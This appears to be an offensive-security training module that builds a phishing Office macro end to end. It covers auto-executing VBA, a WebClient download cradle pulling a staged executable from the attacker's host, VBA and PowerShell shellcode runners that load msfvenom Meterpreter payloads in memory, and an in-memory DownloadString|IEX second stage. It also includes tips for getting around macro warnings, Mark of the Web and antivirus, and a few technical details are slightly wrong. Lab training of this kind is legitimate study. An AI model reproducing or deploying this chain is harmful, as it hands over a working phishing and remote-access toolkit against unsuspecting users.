1. Module brief

Hands-on companion to module 03's middle sections: build a phishing-delivered Office macro end to end — from a first auto-executing macro to a staged Meterpreter session running entirely in memory, first from VBA, then ported to PowerShell. Same building blocks as module 03 (VirtualAlloc / RtlMoveMemory / CreateThread, WebClient cradles), renumbered Listings 1–41.

Lab roles: Kali attacker 192.168.119.120, Windows 11 victim 192.168.120.11. Word 2021 is installed on the victim; course artifacts live in C:\Tools and C:\installs on the victim.

Learning objectives:

  • Calling Win32 APIs from VBA
  • Implementing a VBA shellcode runner
  • Calling Win32 APIs from PowerShell
  • Porting the shellcode runner to PowerShell

2. Office on the victim — the defenses we must survive

Install Word from C:\installs\Word2021Retail.img (double-click mounts it as a virtual CD → Setup.exe); accept the license, decline optional data. The installed version shows under Account options (exercise).

The macro-security gauntlet, in order:

  • Trust Center (File > Options > Trust Center): the default is "Disable all macros with notification" — the victim must click Enable Content on the warning banner for anything to run.
  • Protected View (Office 2010+): documents from the Internet open in a sandbox — macros disabled, external images blocked, an extra warning banner shown.
  • Mark of the Web (MOTW): Office 2021+ / 365 refuse to run macros in any file carrying the Internet-zone flag, even after the victim clicks Enable Editing. This has measurably reduced macro effectiveness.

File formats matter: macros require a macro-enabled format (.doc, .docm); .docx silently drops them. During development we save to the legacy .doc (Word 97-2003) format.

Lab: download C:\Tools\safe.doc to Kali, rename and host it with a Python web server, re-download on Windows 11, and confirm the MOTW attribute is set (file Properties shows the Internet zone).

3. VBA basics

Create a macro via View > Macros, pick the current document from the drop-down (otherwise the macro lands in the global template), name it, Create. Sub MyMacro ... End Sub defines a method (VBA methods return nothing; Function ... End Function returns a value). Declare variables with Dim name As type (Listing 1), branch with If/Else (Listing 2), loop with For/Next (Listing 3):

For counter = 1 To 3
    MsgBox ("Alert")
Next counter

4. Auto-execution and spawning processes

Two entry points fire when the document opens; use both for redundancy (Listing 4):

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

(The Excel counterpart of Document_Open() is Workbook_Open().)

From there, spawn processes: Shell "cmd.exe" opens a visible cmd (Listing 5); the Windows Script Host route hides it (Listing 6):

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub

Verify with Process Explorer: cmd.exe appears as a child of WINWORD.EXE.

5. PowerShell download cradle inside the macro

Four-line PowerShell download of the staged Meterpreter executable (Listing 7), compressed to a one-liner (Listing 8):

(New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')

Embed it in VBA with Shell str, vbHide (Listing 9). The download lands in the Word process's current folder — resolve the full path for execution with ActiveDocument.Path (Listing 10). Word has no Sleep, so implement one with a busy loop (Listing 11):

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub

The completed macro (Listing 12) then chains: cradle → Wait → Shell exePath — with msfstaged.exe staged on the Kali web server and a multi/handler waiting.

Exercises: which cmdlet runs when curl is typed in PowerShell on Windows 11? Then build the same cradle with Invoke-WebRequest — what parameter stores the file?

6. Calling Win32 APIs from VBA

VBA imports unmanaged functions with the Declare statement (Declare PtrSafe for 64-bit VBA). The C prototype for GetUserNameA (advapi32.dll) is:

BOOL GetUserNameA(
  [out]     LPSTR   lpBuffer,
  [in, out] LPDWORD pcbBuffer
);

Translate the C types (BOOL→Long, LPSTR→String, LPDWORD→Long), mark in-params ByVal and out-params ByRef (Listing 13):

Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long

Calling it needs a fixed-size string buffer (a C string is null-terminated — the buffer is oversized and the tail padded with spaces). Recover the real length by locating the null char with InStr, then substring with Left$ (Listing 16):

Function MyMacro()
  Dim MyBuff As String * 256
  Dim MySize As Long
  Dim strlen As Long
  MySize = 256
  MySize = GetUserName(MyBuff, MySize)
  strlen = InStr(1, MyBuff, vbNullChar) - 1
  MsgBox Left$(MyBuff, strlen)
End Function

This proof of concept is the gate to everything below: arbitrary Win32 APIs callable directly from VBA.

Exercises: call GetPhysicallyInstalledSystemMemory and report installed RAM; port the API to GetVersionEx.

7. VBA shellcode runner

Four imports, then the payload.

VirtualAlloc (kernel32) reserves executable memory (Listing 17). Arguments: lpAddress = 0 (let the OS choose), dwSize = UBound(buf) + 1 (dynamic — survives payload swaps; VBA arrays are zero-indexed), flAllocationType = &H3000 (MEM_COMMIT | MEM_RESERVE), flProtect = &H40 (PAGE_EXECUTE_READWRITE).

The shellcode comes from msfvenom in vbapplication format (Listing 19) — note EXITFUNC=thread so Word survives the shell:

kali@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 EXITFUNC=thread -f vbapplication
...
Payload size: 793 bytes
Final size of vbapplication file: 2655 bytes
buf = Array(<793 decimal byte values — paste verbatim into the macro>)

RtlMoveMemory (Listing 21 prototype, Listing 22 declare) copies the array into the allocated buffer byte-by-byte:

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Destination is already a pointer (pass as-is); Source is the array element (by reference); Length by value. The copy loop itself is a plain For counter = LBound(buf) To UBound(buf) walking one byte per iteration (Listing 23).

CreateThread (Listing 24 prototype / declare, invoked in Listing 26) points a new execution thread at addr, the address VirtualAlloc returned. With buf pasted in, the assembled macro (Listing 27) yields a Meterpreter session — Word stays alive the whole time.

Exercise: rebuild the runner with windows/x64/meterpreter/reverse_tcp on port 50000 — catch it with the matching multi/handler.

8. Porting the runner to PowerShell

Why port at all? Two motivations: embedding shellcode straight into the document turns the file into a static-AV target, and a VBA runner's thread dies with its host — we want the payload to outlive Word.

Warm up with a managed API first: MessageBox from user32.dll (Listing 28 C prototype). Translate via P/Invoke (www.pinvoke.net documents the common signatures) into a C# DllImport (Listing 29), wrap it with the required namespaces, and compile at runtime with Add-Type in PowerShell:

using System;
using System.Runtime.InteropServices;

public class User32 {
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
  public static extern int MessageBox(int hWnd, String text, String caption, uint type);
}

A [User32]::MessageBox(0,"txt","title",0) call pops the box — unmanaged code from PowerShell.

For the shellcode runner, P/Invoke the kernel32 trio into a C# class in the same way (Listing 34): VirtualAlloc (LPVOID→IntPtr, sizes as UInt32/int) and CreateThread.

Regenerate the payload in ps1 format (Listing 35, EXITFUNC=thread, 800 bytes; the [Byte[]] $buf = <msfvenom output> array is pasted as-is). The runner itself (Listing 36) is the same three-step chain as §7:

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

Catch it with multi/handler (Listing 37) and the session opens.

Delivery from Word. Do not embed the runner in the macro — stage it. The macro carries only a download cradle that pulls run.ps1 into memory and executes it (Listing 38):

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.119.120/run.ps1') | IEX"
    Shell str, vbHide
End Sub

The two auto-execution wrappers call it, exactly as in §4:

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Copy the runner into run.ps1 in the Kali Apache web root (sudo cp runner.ps1 /var/www/html/run.ps1), sudo systemctl start apache2, then open the macro document.

9. Troubleshooting: the dying shell

First attempt catches nothing. Triage: the macro fired — Apache's access log shows the GET (Listing 39):

kali@kali:~$ sudo tail /var/log/apache2/access.log
...
192.168.120.11 - - [08/Jun/2024:05:21:22 -0400] "GET /run.ps1 HTTP/1.1" 200 4202 "-" "-"

Process Explorer (if we're quick) shows a PowerShell process spawning and immediately terminating. Diagnosis: the VBA runner's parent (Word) never exits, but here the parent is PowerShell, which ends the moment run.ps1 finishes — killing the Meterpreter thread with it.

Fix: import WaitForSingleObject alongside the other kernel32 functions (a DWORD handle plus a DWORD timeout) and, after CreateThread, block the parent on the shellcode thread's handle with an infinite wait (Listing 40):

$WaitForSingleObject = [Kernel32]::WaitForSingleObject($thandle, 0xFFFFFFFF)
[int32]$WaitForSingleObject

Note the [int32] cast — PowerShell 5 runs 64-bit but renders unmanaged ints as signed, so 0xFFFFFFFF must be cast or the call throws a type error. With the parent parked, the session is stable (Listing 41).

Exercises: report GetDriveType's return when the victim browses a network share; save the runner as a .txt and load it with Get-Content — why does that evade Office's macro defenses?

10. Notes and gotchas

  • EXITFUNC=thread on every msfvenom payload in this module — process would kill Word/PowerShell when the stage exits.
  • Size the allocation dynamically (UBound/$buf.Length), never hardcode payload size.
  • VBA hex is &H3000/&H40; the values are MEM_COMMIT|MEM_RESERVE and PAGE_EXECUTE_READWRITE.
  • Shell str, vbHide hides the console but the process still runs; CreateObject("Wscript.Shell").Run str, 0 is the WSH alternative.
  • DownloadString | IEX keeps the second stage entirely in memory — only the macro-cradle text ever hits disk.
  • PowerShell's WaitForSingleObject needs an explicit [int32]-compatible timeout or the invocation fails.
  • MOTW + Protected View are the real-world blockers: a .doc re-hosted from the Internet carries the zone flag even after renaming.
